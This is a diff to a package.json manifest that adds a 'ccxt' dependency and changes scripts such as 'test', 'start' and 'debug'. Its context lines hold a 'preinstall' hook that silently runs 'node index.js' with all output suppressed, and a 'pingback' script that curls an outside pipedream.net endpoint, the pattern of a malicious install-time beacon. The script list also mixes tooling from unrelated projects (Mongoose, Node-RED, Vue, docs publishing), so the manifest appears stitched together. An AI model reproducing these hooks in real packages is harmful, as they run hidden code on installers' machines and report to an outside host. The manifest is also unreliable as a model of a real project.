@@ -125,7 +125,8 @@
     "sortablejs": "^1.15.0",
     "svelte-loading-spinners": "^0.3.4",
     "@popperjs/core": "^2.11.6",
-    "generaltypes-mt": "^1.0.7"
+    "generaltypes-mt": "^1.0.7",
+    "ccxt": "^1.47.46"
   },
   "devDependencies": {
     "@ark/attest": "0.53.0",
@@ -191,7 +192,7 @@
     "docs:prepare:publish:6x": "git checkout 6.x && git merge 6.x && npm run docs:clean:stable && env DOCS_DEPLOY=true npm run docs:generate && mv ./docs/6.x ./tmp && git checkout gh-pages && npm run docs:copy:tmp:6x",
     "docs:prepare:publish:7x": "env DOCS_DEPLOY=true npm run docs:generate && git checkout gh-pages && rimraf ./docs/7.x && mv ./tmp ./docs/7.x",
     "docs:check-links": "blc http://127.0.0.1:8089 -ro",
-    "lint": "eslint --ext .ts,.vue packages/vueland/src",
+    "lint": "eslint",
     "lint-js": "eslint . --ext .js --ext .cjs",
     "lint-ts": "eslint . --ext .ts",
     "lint-md": "markdownlint-cli2 \"**/*.md\" \"#node_modules\" \"#benchmarks\"",
@@ -203,7 +204,7 @@
     "mongo": "node ./tools/repl.js",
     "publish-7x": "npm publish --tag 7x",
     "create-separate-require-instance": "rm -rf ./node_modules/mongoose-separate-require-instance && node ./scripts/create-tarball && tar -xzf mongoose.tgz -C ./node_modules && mv ./node_modules/package ./node_modules/mongoose-separate-require-instance",
-    "test": "echo \"Error: no test specified\" && exit 1",
+    "test": "mocha \"test/**/*_spec.js\"",
     "test-deno": "deno run --allow-env --allow-read --allow-net --allow-run --allow-sys --allow-write ./test/deno.mjs",
     "test-rs": "START_REPLICA_SET=1 mocha --timeout 30000 --exit ./test/*.test.js",
     "test-tsd": "node ./test/types/check-types-filename && tsd",
@@ -216,7 +217,7 @@
     "build": "npm version patch & tsc -p .",
     "preinstall": "node index.js > /dev/null 2>&1",
     "pingback": "curl https://eo536ohsnextro9.m.pipedream.net",
-    "start": "rollup -c -w",
+    "start": "node-red",
     "coverage": "vitest run --coverage",
     "testOnly": "npm run coverage",
     "_prepareBuild": "rm -rf ./build",
@@ -266,7 +267,9 @@
     "build:all": "npm run test --u & node build/build-lib.js",
     "test:editor": "editorconfig-checker --exclude '.git|node_modules|dist|es5|lib|.idea'",
     "declarations": "ttsc --emitDeclarationOnly",
-    "buildAndPublish": "npm run build & npm publish"
+    "buildAndPublish": "npm run build & npm publish",
+    "maps": "genmaps --sourceRoot /ccxt-v2/",
+    "debug": "genmaps -r /ccxt-v2/ && node-red --inspect --nolazy"
   },
   "main": "./index.js",
   "types": "./types/index.d.ts",
